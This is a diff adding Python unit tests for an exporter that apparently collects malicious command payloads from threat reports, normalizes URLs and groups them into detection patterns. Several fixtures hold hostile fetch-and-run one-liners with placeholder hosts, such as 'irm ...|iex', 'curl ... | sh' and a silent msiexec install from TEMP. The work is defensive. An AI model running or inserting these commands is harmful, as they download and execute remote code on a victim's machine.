@@ -455,5 +455,113 @@ class ExportTests(unittest.TestCase):
                 self.assertEqual(file.read_text(), content)
 
 
+class PatternTests(unittest.TestCase):
+    def entry(self, report_id, payload, stamp="2026-11-13T10:00:00Z"):
+        return {"ReportId": report_id, "ScannedAt": stamp, "Payload": payload}
+
+    def test_normalizes_urls_without_rewriting_other_command_values(self):
+        self.assertEqual(
+            exporter.normalize_payload(
+                '  $f="$env:TEMP\\file.msi";iwr "http://host[.]example/x";'
+                'cmd /c msiexec /i $f /qn;  '
+            ),
+            '$f="$env:TEMP\\file.msi";iwr "<URL>";cmd /c msiexec /i $f /qn;',
+        )
+        self.assertEqual(
+            exporter.normalize_payload("irm 'host.example/x'|iex"),
+            "irm '<URL>'|iex",
+        )
+        self.assertEqual(
+            exporter.normalize_payload('curl https://host.example/a?x=1&y=2 | sh'),
+            'curl <URL> | sh',
+        )
+        self.assertEqual(
+            exporter.normalize_payload('echo file.msi\r\nWrite-Output "A  B"'),
+            'echo file.msi\nWrite-Output "A  B"',
+        )
+
+    def test_includes_all_families_singletons_and_long_payloads(self):
+        entries = [
+            self.entry("a", "irm 'https://a.example/x'|iex"),
+            self.entry("b", "irm 'https://b.example/x'|iex",
+                       "2026-11-12T10:00:00+00:00"),
+            self.entry("c", "curl https://c.example/x | sh"),
+            self.entry("d", "$encoded='" + "A" * 3000 + "'"),
+            self.entry("e", None),
+            self.entry("f", " \n "),
+        ]
+        patterns = exporter.build_patterns(entries + [entries[0]])
+        self.assertEqual(len(patterns), 3)
+        self.assertEqual(patterns[0]["Pattern"], "irm '<URL>'|iex")
+        self.assertEqual(patterns[0]["DistinctPayloadCount"], 2)
+        self.assertEqual(patterns[0]["ReportCount"], 2)
+        self.assertEqual(patterns[0]["ReportIds"], ["a", "b"])
+        self.assertEqual(patterns[0]["FirstSeen"], "2026-11-12T10:00:00+00:00")
+        self.assertEqual(patterns[0]["LastSeen"], "2026-11-13T10:00:00+00:00")
+        self.assertEqual(
+            exporter.build_patterns(list(reversed(entries))), patterns
+        )
+
+    def test_identical_payloads_have_separate_report_and_variant_counts(self):
+        patterns = exporter.build_patterns([
+            self.entry("a", "echo hello"), self.entry("b", "echo hello"),
+        ])
+        self.assertEqual(patterns[0]["DistinctPayloadCount"], 1)
+        self.assertEqual(patterns[0]["ReportCount"], 2)
+
+    def test_invalid_reports_fail_explicitly(self):
+        invalid = [
+            {}, self.entry("a", 42), self.entry("a", "echo", "bad date"),
+            self.entry("a", "echo", "2026-11-13T10:00:00"),
+        ]
+        for entry in invalid:
+            with self.subTest(entry=entry), self.assertRaises(ValueError):
+                exporter.build_patterns([entry])
+        with self.assertRaisesRegex(ValueError, "Conflicting"):
+            exporter.build_patterns([
+                self.entry("a", "echo one"), self.entry("a", "echo two"),
+            ])
+
+    def test_text_lines_round_trip_and_unchanged_files_are_not_rewritten(self):
+        patterns = exporter.build_patterns([
+            self.entry("a", 'echo "A  B"\necho C:\\temp\\file'),
+        ])
+        with tempfile.TemporaryDirectory() as directory:
+            output = Path(directory)
+            exporter.write_patterns(output, patterns)
+            text = (output / "Patterns.txt").read_text(encoding="utf-8")
+            self.assertEqual(len(text.splitlines()), 1)
+            self.assertEqual(json.loads('"' + text.strip() + '"'), patterns[0]["Pattern"])
+            self.assertEqual(
+                json.loads((output / "Patterns.json").read_text(encoding="utf-8")),
+                patterns,
+            )
+            with patch.object(Path, "write_text") as write:
+                exporter.write_patterns(output, patterns)
+                write.assert_not_called()
+            exporter.write_patterns(output, [])
+            self.assertEqual((output / "Patterns.txt").read_text(), "")
+            self.assertEqual(json.loads((output / "Patterns.json").read_text()), [])
+
+    def test_export_generates_patterns_from_same_seven_day_set(self):
+        with tempfile.TemporaryDirectory() as directory:
+            output = Path(directory)
+            page = report(extracted=(
+                '<section class="obs-alert obs-alert-danger">'
+                '<h2>Extracted payload</h2>'
+                '<pre class="obs-data">irm https://host.example/x|iex</pre>'
+                '</section>'
+            ))
+            with patch.object(exporter, "fetch", side_effect=[
+                sitemap([("a", "2026-11-13T10:00:00Z")]), page.encode(),
+            ]):
+                exporter.export(output, datetime(2026, 11, 13, 12, tzinfo=timezone.utc), 0)
+            entries = json.loads((output / "sets" / "7D.json").read_text())
+            self.assertEqual(
+                json.loads((output / "Patterns.json").read_text()),
+                exporter.build_patterns(entries),
+            )
+
+
 if __name__ == "__main__":
     unittest.main()
